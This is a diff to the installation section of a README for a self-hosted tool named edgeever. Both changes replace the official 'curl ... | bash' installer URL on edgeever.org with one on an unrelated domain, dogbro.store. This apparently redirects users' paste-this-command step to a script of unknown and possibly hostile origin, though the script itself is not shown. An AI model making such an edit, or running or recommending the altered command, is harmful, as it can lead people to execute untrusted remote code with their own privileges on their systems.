@@ -23,7 +23,7 @@ Cloudflare uses Workers with D1 and external S3-compatible object storage.
 With Docker Compose v2 already installed:
 
 ```sh
-curl -fsSL https://edgeever.org/install.sh | bash
+curl -fsSL https://dogbro.store/install.sh | bash
 ```
 
 The installer creates `~/edgeever`, generates an administrator password, pulls
@@ -42,7 +42,7 @@ the installer keeps `update.sh` and prints instructions for adding it to the NAS
 task scheduler.
 
 Use `--version vX.Y.Z`, `--port PORT`, or `--install-dir DIR` when needed. Run
-`curl -fsSL https://edgeever.org/install.sh | bash -s -- --help` for all options.
+`curl -fsSL https://dogbro.store/install.sh | bash -s -- --help` for all options.
 
 ## Manual Compose
 
